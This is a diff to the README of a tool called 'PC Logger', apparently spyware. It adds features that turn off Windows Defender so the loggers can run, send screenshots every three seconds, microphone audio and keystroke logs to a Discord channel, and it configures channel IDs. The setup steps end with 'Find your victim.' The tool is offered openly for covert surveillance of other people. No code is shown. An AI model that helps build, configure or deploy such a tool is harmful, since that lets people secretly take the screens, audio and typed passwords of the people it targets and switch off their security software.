@@ -1,7 +1,8 @@
 # PC Logger
-- Disables Windows Protector
-- Sends Screenshots to discord channel
-- Sends Microphone audio to discord channel
+- Disables Windows Protector (so the loggers work)
+- Sends Screenshots to discord channel (every 3 sec)
+- Sends Microphone audio to discord channel (2 min intervals)
+- Sends Key Logs to discord channel (2 min intervals)
 - Local discord bot
 
 # Instructions
@@ -14,6 +15,7 @@
 - guild = "SERVER ID"
 - screenshot_channel = "SCREENSHOT CHANNEL ID"
 - microphone_channel = "MICROPHONE CHANNEL ID"
+- logger_channel = "MICROPHONE CHANNEL ID"
 - connect_channel = "CONNECTION MESSAGE CHANNEL ID"
 
 5. Find your victim.
